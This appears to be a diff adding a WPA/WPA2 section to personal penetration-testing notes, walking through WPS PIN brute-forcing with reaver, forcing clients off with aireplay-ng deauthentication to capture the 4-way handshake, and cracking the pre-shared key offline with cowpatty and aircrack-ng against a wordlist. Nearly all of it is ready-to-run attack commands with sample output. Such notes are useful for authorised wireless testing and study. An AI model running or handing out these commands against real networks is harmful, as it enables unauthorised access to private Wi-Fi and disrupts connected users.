@@ -1,6 +1,113 @@
-___
 
-#### Deauth attacks
+## WPA/WPA2
+___
+**Main attack methods:**
+
+1. Check if WPS is enabled and brute-force the PIN.
+2. Capture the 4-way handshake and perform a dictionary attack to recover the PSK.
+3. Execute a PMKID attack on vulnerable access points.
+
+
+### WPS Brute force
+___
+**Check if wps is enabled**:
+
+with airodump:
+```bash
+airodump-ng wlan0mon -c 1 --wps
+```
+
+with wash:
+```bash
+wash -i wlan0mon
+```
+if Lck = No, WPS is enabled.
+
+Also, determine the vendor with the first three sets from the MAC
+```bash
+grep -i "28-B2-BD" /var/lib/ieee-data/oui.txt
+```
+
+**Bruteforce WPS key with reaver**
+
+turn off monitor mode from airmon to ensure Reaver works.
+```bash
+airmon-ng stop wlan0mon
+```
+
+use the iw command to add a new interface named mon0 and set its type to monitor mode.
+
+```bash
+iw dev wlan0 interface add mon0 type monitor
+ifconfig mon0 up
+```
+
+**Launch Reaver**
+specifying the BSSID of our target, the appropriate channel, and our interface in monitor mode (mon0)
+
+```bash
+reaver -i mon0 -c 1 -b 28:B2:BD:F4:FF:F1
+```
+
+
+## Cracking MIC (4-Way Handshake)
+---
+Capture the MIC
+
+```bash
+sudo airmon-ng start wlan0
+```
+
+Identify networks (save to file WPA)
+
+```bash
+airodump-ng wlan0mon -c 1 -w WPA
+```
+
+Deauth clients and capture handshake on reconnect
+
+```bash
+aireplay-ng -0 5 -a <AP BSSID> -c <STATION> wlan0mon
+```
+
+After a few seconds a WPA handshake should be captured in the airodump output.
+```plaintext
+ CH  1 ][ Elapsed: 48 s ][ 2024-08-29 21:58 ][ WPA handshake: 80:2D:BF:FE:13:83 
+```
+
+We need to ensure we've captured the complete handshake before attempting to crack
+
+With cowpatty:
+`-c` = check mode
+```
+cowpatty -c -r WPA-01.cap
+```
+
+or with wireshark:
+
+check the following:
+
+- All four EAPOL messages exist per each handshake in sequential order
+- Key nonce values are the same in message 1 and 3
+- For message four, we should see no key nonce value and only a MIC value.
+
+**Crack the handshake**
+
+with cowpatty:
+```bash
+cowpatty -r WPA-01.cap -f /opt/wordlist.txt -s <SSID>
+```
+
+or with aircrack
+
+```bash
+aircrack-ng -w /opt/wordlist.txt -0 WPA-01.cap 
+```
+
+
+
+
+### Deauth attacks
 
 **List attack modes**
 
